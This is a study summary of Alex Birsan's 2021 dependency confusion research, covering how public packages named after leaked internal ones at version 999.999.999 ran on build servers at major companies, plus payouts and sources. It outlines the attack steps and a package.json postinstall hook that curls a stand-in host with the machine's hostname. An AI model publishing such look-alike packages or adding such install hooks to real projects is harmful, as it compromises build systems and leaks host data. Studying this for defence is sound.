# 04 · Dependency Confusion — Supply Chain Takeover of 35+ Companies

> 🎫 **Credit**
> **Researcher:** Alex Birsan
> **Targets:** Apple, Microsoft, PayPal, Shopify, Netflix, Uber, Yelp, Tesla + 35 others
> **Platform:** Multiple (HackerOne + direct) · **Year:** 2021
> **Payout:** **$130,000+** (Microsoft $40K, Apple/PayPal/Shopify $30K each, + more)
> **Original writeup:** [*Dependency Confusion* — Alex Birsan (Medium)](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)

---

## 🎯 TL;DR

Companies install **internal** private packages (e.g. `@company/auth-lib`). Their build systems check *both* the private registry and the *public* one (npm/PyPI/RubyGems), and package managers prefer the **highest version number**. Birsan published public packages with the same names as leaked internal names at version `999.999.999` — and build servers at dozens of major companies pulled his code and executed it.

---

## ⚙️ How it works

The flaw is in resolution precedence: "check public *and* private, take the newest."

```bash
# 1. Harvest internal package names (leaked in public GitHub, JS bundles,
#    package.json fragments, error messages, etc.)
#    e.g. an internal package named "company-auth" at v1.2.3

# 2. Publish a package with the SAME name to the PUBLIC registry,
#    at an absurdly high version:
npm publish company-auth@999.999.999

# 3. The build system resolves "company-auth", sees the public 999.x.x
#    outranks the private 1.2.3, and installs the attacker's package.

# 4. A postinstall script runs during install — code execution on the
#    internal build server.
```

```json
// Proof-of-execution payload (harmless telemetry only)
{
  "scripts": {
    "postinstall": "curl https://birsan.example/log?pkg=TARGET&host=$HOSTNAME"
  }
}
```

Birsan's packages phoned home with benign telemetry (hostname, DNS) to *prove* execution without causing harm — and landed on build servers at 35+ companies.

---

## 💡 Why it's brilliant

- **It invented a vulnerability class.** "Dependency confusion" is now a standard term, a standard audit check, and the reason npm/registries added scoping protections. One researcher, one idea, industry-wide impact.
- **One technique, N bounties.** Instead of hunting one target, Birsan found a flaw in how *everyone* configured package managers and collected from each. The ultimate force-multiplier.
- **Textbook responsible PoC.** Harmless telemetry, no data exfil, undeniable proof. This is how you demonstrate RCE-on-build-server without burning trust.

---

## 💰 Payout & impact

- **$130,000+** across programs (Microsoft's $40K was its highest ever at the time).
- Code execution on internal build infrastructure at Apple, Microsoft, PayPal, Shopify, Netflix, Uber, Yelp, Tesla and more.
- Triggered permanent changes to npm/PyPI/RubyGems and corporate build tooling.

---

## 🔗 Sources

- [Alex Birsan — Dependency Confusion (Medium)](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
- [PortSwigger — Researcher hacks Apple, Microsoft and others in novel supply chain attack](https://portswigger.net/daily-swig/researcher-hacks-apple-microsoft-and-other-major-tech-companies-in-novel-supply-chain-attack)
- [CSO Online — Dependency confusion explained](https://www.csoonline.com/article/570433/dependency-confusion-explained-another-risk-when-using-open-source-repositories.html)

> All credit to **Alex Birsan**. This page is a study summary — read the original.
